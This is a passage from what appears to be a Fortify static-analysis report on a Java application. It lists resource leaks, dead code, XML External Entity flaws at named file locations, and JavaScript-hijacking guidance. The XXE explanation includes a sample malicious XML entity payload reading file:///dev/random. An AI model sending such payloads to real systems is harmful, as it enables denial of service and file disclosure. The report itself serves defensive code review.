<Value>1. This issue may be a false positive if the program uses reflection to access private methods. (This is a non-standard practice. Private methods that are only invoked via reflection should be well documented.)</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>31</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="35624A4BA18D0B67DDA5D7C98DC41949" ruleID="6F84D4B0-3B7E-4463-A165-76135931D192">
                            <Category>Dead Code: Unused Method</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The method changeFileLocationAndNameClaimsLoad() in FileUtil.java is not reachable from any method outside the class. It is dead code. Dead code is defined as code that is never directly or indirectly executed by a public method.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FileUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/file/FileUtil.java</FilePath>
<LineStart>797</LineStart>
<Snippet>     */
//Start MI_TEAM 17/07/08 WA to MI Framework changes
    private static boolean changeFileLocationAndNameClaimsLoad(String p_sOriginalFileName,
                                                               boolean p_bIsOriginalRemote,
                                                               String p_sNewFileName,</Snippet>
<TargetFunction>Function: changeFileLocationAndNameClaimsLoad()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="373C982C3E44577A2A84BEA19C335145" ruleID="6F84D4B0-3B7E-4463-A165-76135931D192">
                            <Category>Dead Code: Unused Method</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The method getPropertyValueById() in SystemProperties.java is not reachable from any method outside the class. It is dead code. Dead code is defined as code that is never directly or indirectly executed by a public method.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SystemProperties.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/util/SystemProperties.java</FilePath>
<LineStart>385</LineStart>
<Snippet> * @return the property value by id
 */
    private static String getPropertyValueById(Element p_objPropertyElement,
                                              String p_sValueIdValue)
    {</Snippet>
<TargetFunction>Function: getPropertyValueById()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="9B8352B89E3FBF8ACEB5557064E351F5" ruleID="6F84D4B0-3B7E-4463-A165-76135931D192">
                            <Category>Dead Code: Unused Method</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The method isFileSizeValid() in FileUtil.java is not reachable from any method outside the class. It is dead code. Dead code is defined as code that is never directly or indirectly executed by a public method.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FileUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/file/FileUtil.java</FilePath>
<LineStart>466</LineStart>
<Snippet>     * @return boolean
     */
    private static boolean isFileSizeValid(File p_objFile) {
        return true;
    }</Snippet>
<TargetFunction>Function: isFileSizeValid()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="F559B4AECFE92EA472D64B897BA7CC9F" ruleID="6F84D4B0-3B7E-4463-A165-76135931D192">
                            <Category>Dead Code: Unused Method</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The method getNestedProperty() in TagReflectionUtil.java is not reachable from any method outside the class. It is dead code. Dead code is defined as code that is never directly or indirectly executed by a public method.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>TagReflectionUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/tag/reflection/TagReflectionUtil.java</FilePath>
<LineStart>244</LineStart>
<Snippet>	  
	  
	  private String getNestedProperty(String p_sProperty)
	  {
		  return "";</Snippet>
<TargetFunction>Function: getNestedProperty()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="F7E015D18E8D238C3B4E119C9AC4DEC5" ruleID="6F84D4B0-3B7E-4463-A165-76135931D192">
                            <Category>Dead Code: Unused Method</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The method isPageHasChildCtrls() in PagePgCtrlWithChildCacheManager.java is not reachable from any method outside the class. It is dead code. Dead code is defined as code that is never directly or indirectly executed by a public method.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>PagePgCtrlWithChildCacheManager.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/cache/PagePgCtrlWithChildCacheManager.java</FilePath>
<LineStart>109</LineStart>
<Snippet>   * @return the string
   */
  private String isPageHasChildCtrls(String p_sPageName) 
  {
    return (String)m_mapPageDet.get(p_sPageName);</Snippet>
<TargetFunction>Function: isPageHasChildCtrls()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="27">
                        <groupTitle>Unreleased Resource: Database</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The function getAllPageControlPriv() in SecurityBean.java sometimes fails to release a database resource allocated by &lt;a href="location://CNSI-JAR/src/com/cnsi/security/ejb/SecurityBean.java###80###10###0"&gt;getConnection()&lt;/a&gt; on line 135.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Resource leaks have at least two common causes:

- Error conditions and other exceptional circumstances.

- Confusion over which part of the program is responsible for releasing the resource.

Most unreleased resource issues result in general software reliability problems. However, if an attacker can intentionally trigger a resource leak, the attacker may be able to launch a denial of service attack by depleting the resource pool.

Example: Under normal conditions, the following code executes a database query, processes the results returned by the database, and closes the allocated statement object. But if an exception occurs while executing the SQL or processing the results, the statement object will not be closed. If this happens often enough, the database will run out of available cursors and not be able to execute any more SQL queries.

  Statement stmt = conn.createStatement();
  ResultSet rs = stmt.executeQuery(CXN_SQL);
  harvestResults(rs);
  stmt.close();

</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>1. Never rely on finalize() to reclaim resources. In order for an object's finalize() method to be invoked, the garbage collector must determine that the object is eligible for garbage collection. Because the garbage collector is not required to run unless the JVM is low on memory, there is no guarantee that an object's finalize() method will be invoked in an expedient fashion. When the garbage collector finally does run, it may cause a large number of resources to be reclaimed in a short period of time, which can lead to "bursty" performance and lower overall system throughput. This effect becomes more pronounced as the load on the system increases.

Finally, if it is possible for a resource reclamation operation to hang (if it requires communicating over a network to a database, for example), then the thread that is executing the finalize() method will hang.

2. Release resources in a finally block. The code for the Example should be rewritten as follows:


  public void execCxnSql(Connection conn) {
    Statement stmt;
    try {
      stmt = conn.createStatement();
      ResultSet rs = stmt.executeQuery(CXN_SQL);
      ...
    }
    finally {
      if (stmt != null) {
        safeClose(stmt);
      }
    }
}

public static void safeClose(Statement stmt) {
  if (stmt != null) {
    try {
      stmt.close();
    } catch (SQLException e) {
      log(e);
    }
  }
}


This solution uses a helper function to log the exceptions that might occur when trying to close the statement. Presumably this helper function will be reused whenever a statement needs to be closed.

Also, the execCxnSql method does not initialize the stmt object to null. Instead, it checks to ensure that stmt is not null before calling safeClose(). Without the null check, the Java compiler reports that stmt might not be initialized. This choice takes advantage of Java's ability to detect uninitialized variables. If stmt is initialized to null in a more complex method, cases in which stmt is used without being initialized will not be detected by the compiler.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. Be aware that closing a database connection may or may not automatically free other resources associated with the connection object. If the application uses connection pooling, it is best to explicitly close the other resources after the connection is closed. If the application is not using connection pooling, the other resources are automatically closed when the database connection is closed. In such a case, this vulnerability is invalid.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>27</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="1A12D25C8E8440B89AC61426544B2ECC" ruleID="B7DFF4A8-9817-4418-A35B-E70D10DC825E">
                            <Category>Unreleased Resource: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The function getAllAppAreas() in SecurityBean.java sometimes fails to release a database resource allocated by &lt;a href="location://CNSI-JAR/src/com/cnsi/security/ejb/SecurityBean.java###80###10###0"&gt;getConnection()&lt;/a&gt; on line 202.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>SecurityBean.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/security/ejb/SecurityBean.java</FilePath>
<LineStart>214</LineStart>
<Snippet>		finally {
			try {
				closeConnection(l_objConn);
			} //end of try
			catch (Exception exSQL) {</Snippet>
<TargetFunction>?.closeConnection(l_objConn)</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="85A930F79688D5A9801C3D42DFFFD4D6" ruleID="B7DFF4A8-9817-4418-A35B-E70D10DC825E">
                            <Category>Unreleased Resource: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The function getAllPageControlPriv() in SecurityBean.java sometimes fails to release a database resource allocated by &lt;a href="location://CNSI-JAR/src/com/cnsi/security/ejb/SecurityBean.java###80###10###0"&gt;getConnection()&lt;/a&gt; on line 135.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>SecurityBean.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/security/ejb/SecurityBean.java</FilePath>
<LineStart>164</LineStart>
<Snippet>		finally {
			try {
				closeConnection(l_objConn);
			}  //end of try
			catch (Exception exSQL) {</Snippet>
<TargetFunction>?.closeConnection(l_objConn)</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="88767977B23D9EEEF3C8173BD34D41CA" ruleID="B7DFF4A8-9817-4418-A35B-E70D10DC825E">
                            <Category>Unreleased Resource: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The function getRecoveryPwd() in SecurityBean.java sometimes fails to release a database resource allocated by &lt;a href="location://CNSI-JAR/src/com/cnsi/security/ejb/SecurityBean.java###80###10###0"&gt;getConnection()&lt;/a&gt; on line 356.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>SecurityBean.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/security/ejb/SecurityBean.java</FilePath>
<LineStart>391</LineStart>
<Snippet>		finally {
			try {
				closeConnection(l_objConn);
			} //end of try
			catch (Exception exSQL) {</Snippet>
<TargetFunction>?.closeConnection(l_objConn)</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="06C02BDD4F38D155D70862ED3BA5DACA" ruleID="B7DFF4A8-9817-4418-A35B-E70D10DC825E">
                            <Category>Unreleased Resource: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The function isValidUser() in SecurityBean.java sometimes fails to release a database resource allocated by &lt;a href="location://CNSI-JAR/src/com/cnsi/security/ejb/SecurityBean.java###80###10###0"&gt;getConnection()&lt;/a&gt; on line 268.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>SecurityBean.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/security/ejb/SecurityBean.java</FilePath>
<LineStart>305</LineStart>
<Snippet>		finally {
			try {
				closeConnection(l_objConn);
			} //end of try
			catch (Exception exSQL) {</Snippet>
<TargetFunction>?.closeConnection(l_objConn)</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="B037C432ADB7ADAC2B95C1A8DDA5F084" ruleID="B7DFF4A8-9817-4418-A35B-E70D10DC825E">
                            <Category>Unreleased Resource: Database</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The function resetPwd() in SecurityBean.java sometimes fails to release a database resource allocated by &lt;a href="location://CNSI-JAR/src/com/cnsi/security/ejb/SecurityBean.java###80###10###0"&gt;getConnection()&lt;/a&gt; on line 430.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>SecurityBean.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/security/ejb/SecurityBean.java</FilePath>
<LineStart>460</LineStart>
<Snippet>			finally {
				try {
					closeConnection(l_objConn);
				} //end of try
				catch (Exception exSQL) {</Snippet>
<TargetFunction>?.closeConnection(l_objConn)</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="27">
                        <groupTitle>Unreleased Resource: Streams</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The function main() in CNSIEditorBean.java sometimes fails to release a system resource allocated by FileInputStream() on line 447.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>The program can potentially fail to release a system resource.

Resource leaks have at least two common causes:

- Error conditions and other exceptional circumstances.

- Confusion over which part of the program is responsible for releasing the resource.

Most unreleased resource issues result in general software reliability problems. However, if an attacker can intentionally trigger a resource leak, the attacker may be able to launch a denial of service attack by depleting the resource pool.

Example: The following method never closes the file handle it opens. The finalize() method for FileInputStream eventually calls close(), but there is no guarantee as to how long it will take before the finalize() method will be invoked. In a busy environment, this can result in the JVM using up all of its file handles.

private void processFile(String fName) throws FileNotFoundException, IOException {
  FileInputStream fis = new FileInputStream(fName);
  int sz;
  byte[] byteArray = new byte[BLOCK_SIZE];
  while ((sz = fis.read(byteArray)) != -1) {
    processBytes(byteArray, sz);
  }
}
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>1. Never rely on finalize() to reclaim resources. In order for an object's finalize() method to be invoked, the garbage collector must determine that the object is eligible for garbage collection. Because the garbage collector is not required to run unless the JVM is low on memory, there is no guarantee that an object's finalize() method will be invoked in an expedient fashion. When the garbage collector finally does run, it may cause a large number of resources to be reclaimed in a short period of time, which can lead to "bursty" performance and lower overall system throughput. This effect becomes more pronounced as the load on the system increases.

Finally, if it is possible for a resource reclamation operation to hang (if it requires communicating over a network to a database, for example), then the thread that is executing the finalize() method will hang.

2. Release resources in a finally block. The code for the Example should be rewritten as follows:


public void processFile(String fName) throws FileNotFoundException, IOException {
  FileInputStream fis;
  try {
    fis = new FileInputStream(fName);
    int sz;
    byte[] byteArray = new byte[BLOCK_SIZE];
    while ((sz = fis.read(byteArray)) != -1) {
      processBytes(byteArray, sz);
    }
  }
  finally {
    if (fis != null) {
      safeClose(fis);
    }
  }
}

public static void safeClose(FileInputStream fis) {
  if (fis != null) {
    try {
      fis.close();
    } catch (IOException e) {
      log(e);
    }
  }
}


This solution uses a helper function to log the exceptions that might occur when trying to close the stream. Presumably this helper function will be reused whenever a stream needs to be closed.

Also, the processFile method does not initialize the fis object to null. Instead, it checks to ensure that fis is not null before calling safeClose(). Without the null check, the Java compiler reports that fis might not be initialized. This choice takes advantage of Java's ability to detect uninitialized variables. If fis is initialized to null in a more complex method, cases in which fis is used without being initialized will not be detected by the compiler.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>27</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="7BB21C0BAB81C29604165629EE7BA431" ruleID="74714BFC-EDF7-445B-8672-0996214D5845">
                            <Category>Unreleased Resource: Streams</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The function main() in CNSIEditorBean.java sometimes fails to release a system resource allocated by FileInputStream() on line 447.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>CNSIEditorBean.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/CNSIEditorBean.java</FilePath>
<LineStart>450</LineStart>
<Snippet>					"c:/temp/OOHTMLInput.html");
			in = new DataInputStream(fstream);
			br = new BufferedReader(new InputStreamReader(in));
			
</Snippet>
<TargetFunction>br = new BufferedReader(new java.io.InputStreamReader())</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="1C3739AC99D016AB3C5B996B738DF5CC" ruleID="74714BFC-EDF7-445B-8672-0996214D5845">
                            <Category>Unreleased Resource: Streams</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The function getByteArrayFromBlob() in DbUtilImpl.java sometimes fails to release a system resource allocated by getBinaryStream() on line 1717.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>1717</LineStart>
<Snippet>                {
                    //get an input stream from the blob object
                    InputStream b_inInputStream = b_objOracleBlob.getBinaryStream();
                    ByteArrayOutputStream b_outBAOS = new ByteArrayOutputStream(512);
                    byte[] b_objBuff = new byte[128];</Snippet>
<TargetFunction>b_inInputStream = getBinaryStream()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="4C5F4A2F827B54D3D6F77B53C0561D76" ruleID="74714BFC-EDF7-445B-8672-0996214D5845">
                            <Category>Unreleased Resource: Streams</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The function getByteArrayFromClob() in DbUtilImpl.java sometimes fails to release a system resource allocated by getAsciiStream() on line 2023.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>2023</LineStart>
<Snippet>                if (b_objOracleClob != null)
                {
                	java.io.InputStream in = b_objOracleClob.getAsciiStream();
                    ByteArrayOutputStream b_outBAOS = new ByteArrayOutputStream(512);
                    byte[] b_objBuff = new byte[128];</Snippet>
<TargetFunction>in = getAsciiStream()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="4A934EFD94B67EEF0DA48916464410BA" ruleID="74714BFC-EDF7-445B-8672-0996214D5845">
                            <Category>Unreleased Resource: Streams</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The function updateBLOB() in DbUtilImpl.java sometimes fails to release a system resource allocated by getBinaryOutputStream() on line 4085.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>4085</LineStart>
<Snippet>                if (b_objOracleBlob != null)
                {
                    OutputStream b_outStream = ((oracle.sql.BLOB) b_objOracleBlob).getBinaryOutputStream();
                    ByteArrayInputStream b_inBAIS = new ByteArrayInputStream(p_objByteArray);
                    byte[] b_objBuff = new byte[DatabaseConstants.BUFFERSIZE];</Snippet>
<TargetFunction>b_outStream = getBinaryOutputStream()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="5B48142FABB1805DAF7EB6DEAF7D93F7" ruleID="74714BFC-EDF7-445B-8672-0996214D5845">
                            <Category>Unreleased Resource: Streams</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The function getCharArrayFromClob() in DbUtilImpl.java sometimes fails to release a system resource allocated by getCharacterStream() on line 1874.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>1874</LineStart>
<Snippet>                if (b_objOracleClob != null)
                {
                    Reader b_inInputStream = b_objOracleClob.getCharacterStream();
                    CharArrayWriter b_objCAW = new CharArrayWriter(512);
                    char[] b_objBuff = new char[128];</Snippet>
<TargetFunction>b_inInputStream = getCharacterStream()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="26">
                        <groupTitle>XML External Entity Injection</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>XML parser configured in XMLUtil.java:77 does not prevent nor limit external entities resolution. This can expose the parser to an XML External Entities attack.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>XML External Entities attacks benefit from an XML feature to build documents dynamically at the time of processing. An XML entity allows inclusion of data dynamically from a given resource. External entities allow an XML document to include data from an external URI. Unless configured to do otherwise, external entities force the XML parser to access the resource specified by the URI, e.g., a file on the local machine or on a remote system. This behavior exposes the application to XML External Entity (XXE) attacks, which can be used to perform denial of service of the local system, gain unauthorized access to files on the local machine, scan remote machines, and perform denial of service of remote systems.

The following XML document shows an example of an XXE attack.

&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
 &lt;!DOCTYPE foo [
  &lt;!ELEMENT foo ANY &gt;
  &lt;!ENTITY xxe SYSTEM "file:///dev/random" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;


This example could crash the server (on a UNIX system), if the XML parser attempts to substitute the entity with the contents of the /dev/random file.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>An XML parser should be configured securely so that it does not allow external entities as part of an incoming XML document.

To avoid XXE injections the following properties should be set for an XML factory, parser or reader:


factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);


If inline DOCTYPE declaration is not needed, it can be completely disabled with the following property:

factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. Fortify RTA adds protection against this category.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>26</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="CBB4687D69B45C522D9A33707C86042C" ruleID="93A88C53-D00C-4A86-9747-D9A0B3176085">
                            <Category>XML External Entity Injection</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>XML parser configured in XMLUtil.java:164 does not prevent nor limit external entities resolution. This can expose the parser to an XML External Entities attack.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>XMLUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/util/XMLUtil.java</FilePath>
<LineStart>164</LineStart>
<Snippet>    l_objDocBuilder.setErrorHandler(l_objErrorHandler);

    Document l_objDocument = l_objDocBuilder.parse(p_inXMLStream);

    return l_objDocument.getDocumentElement();</Snippet>
<TargetFunction>l_objDocBuilder.parse(...) : XML document parsed allowing external entity resolution()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="9D598D9CE5EF83A2FABDFC2D3AB625B5" ruleID="93A88C53-D00C-4A86-9747-D9A0B3176085">
                            <Category>XML External Entity Injection</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>XML parser configured in EHRHospFormulasXMLUtils.java:55 does not prevent nor limit external entities resolution. This can expose the parser to an XML External Entities attack.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>EHRHospFormulasXMLUtils.java</FileName>
<FilePath>EHR-HOSP-JAR/src/com/ehr/common/EHRHospFormulasXMLUtils.java</FilePath>
<LineStart>55</LineStart>
<Snippet>    l_objDocBuilder.setErrorHandler(l_objErrorHandler);

    Document l_objDocument = l_objDocBuilder.parse(p_sFileNameWithPath);

    return l_objDocument.getDocumentElement();</Snippet>
<TargetFunction>l_objDocBuilder.parse(...) : XML document parsed allowing external entity resolution()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="B63253F58776E4A6CB1D738A7BACC680" ruleID="93A88C53-D00C-4A86-9747-D9A0B3176085">
                            <Category>XML External Entity Injection</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>XML parser configured in XMLUtil.java:135 does not prevent nor limit external entities resolution. This can expose the parser to an XML External Entities attack.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>XMLUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/util/XMLUtil.java</FilePath>
<LineStart>135</LineStart>
<Snippet>    l_objDocBuilder.setErrorHandler(l_objErrorHandler);

    Document l_objDocument = l_objDocBuilder.parse(p_sFileNameWithPath);

    return l_objDocument.getDocumentElement();</Snippet>
<TargetFunction>l_objDocBuilder.parse(...) : XML document parsed allowing external entity resolution()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="2DFCED11668AAB057DFD5C4538DE3983" ruleID="93A88C53-D00C-4A86-9747-D9A0B3176085">
                            <Category>XML External Entity Injection</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>XML parser configured in XMLUtil.java:77 does not prevent nor limit external entities resolution. This can expose the parser to an XML External Entities attack.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>XMLUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/util/XMLUtil.java</FilePath>
<LineStart>77</LineStart>
<Snippet>    l_objDocBuilder.setErrorHandler(l_objErrorHandler);

    Document l_objDocument = l_objDocBuilder.parse(p_sFileNameWithPath);

    return l_objDocument.getDocumentElement();</Snippet>
<TargetFunction>l_objDocBuilder.parse(...) : XML document parsed allowing external entity resolution()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="B30398E7F5ED481AFFBE3362A8E40DA0" ruleID="93A88C53-D00C-4A86-9747-D9A0B3176085">
                            <Category>XML External Entity Injection</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>XML parser configured in XMLUtil.java:106 does not prevent nor limit external entities resolution. This can expose the parser to an XML External Entities attack.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>XMLUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/util/XMLUtil.java</FilePath>
<LineStart>106</LineStart>
<Snippet>    l_objDocBuilder.setErrorHandler(l_objErrorHandler);

    Document l_objDocument = l_objDocBuilder.parse(p_inXMLStream);

    return l_objDocument.getDocumentElement();</Snippet>
<TargetFunction>l_objDocBuilder.parse(...) : XML document parsed allowing external entity resolution()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="24">
                        <groupTitle>JavaScript Hijacking: Vulnerable Framework</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>Applications that use JavaScript notation to transport sensitive data can be vulnerable to JavaScript hijacking, which allows an unauthorized attacker to read confidential data from a vulnerable application.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>An application may be vulnerable to JavaScript hijacking if it: 1) Uses JavaScript objects as a data transfer format 2) Handles confidential data. Because JavaScript hijacking vulnerabilities do not occur as a direct result of a coding mistake, the Fortify Secure Coding Rulepacks call attention to potential JavaScript hijacking vulnerabilities by identifying code that appears to generate JavaScript in an HTTP response.

Web browsers enforce the Same Origin Policy in order to protect users from malicious websites. The Same Origin Policy requires that, in order for JavaScript to access the contents of a web page, both the JavaScript and the web page must originate from the same domain. Without the Same Origin Policy, a malicious website could serve up JavaScript that loads sensitive information from other websites using a client's credentials, culls through it, and communicates it back to the attacker. JavaScript hijacking allows an attacker to bypass the Same Origin Policy in the case that a web application uses JavaScript to communicate confidential information. The loophole in the Same Origin Policy is that it allows JavaScript from any website to be included and executed in the context of any other website. Even though a malicious site cannot directly examine any data loaded from a vulnerable site on the client, it can still take advantage of this loophole by setting up an environment that allows it to witness the execution of the JavaScript and any relevant side effects it may have. Since many Web 2.0 applications use JavaScript as a data transport mechanism, they are often vulnerable while traditional web applications are not.

The most popular format for communicating information in JavaScript is JavaScript Object Notation (JSON). The JSON RFC defines JSON syntax to be a subset of JavaScript object literal syntax. JSON is based on two types of data structures: arrays and objects. Any data transport format where messages can be interpreted as one or more valid JavaScript statements is vulnerable to JavaScript hijacking. JSON makes JavaScript hijacking easier by the fact that a JSON array stands on its own as a valid JavaScript statement. Since arrays are a natural form for communicating lists, they are commonly used wherever an application needs to communicate multiple values. Put another way, a JSON array is directly vulnerable to JavaScript hijacking. A JSON object is only vulnerable if it is wrapped in some other JavaScript construct that stands on its own as a valid JavaScript statement.

